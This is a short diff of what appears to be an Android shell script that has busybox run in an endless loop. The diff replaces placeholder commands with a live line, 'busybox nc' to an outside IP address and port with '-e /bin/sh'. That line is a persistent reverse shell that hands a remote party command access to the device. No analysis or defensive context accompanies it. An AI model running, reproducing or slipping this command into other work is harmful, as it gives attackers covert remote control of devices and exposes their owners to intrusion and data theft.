@@ -9,9 +9,7 @@ chmod +x /data/local/tmp/busybox
 # Run the loop with netcat command
 while true
 do
-  #/data/local/tmp/busybox nc 3.13.191.225 16858 -e /bin/sh
-  /data/local/tmp/busybox
-  touch /sdcard/scuss11
-  sleep 100
+  /data/local/tmp/busybox nc 3.141.142.211 14817 -e /bin/sh
+  
 done
 
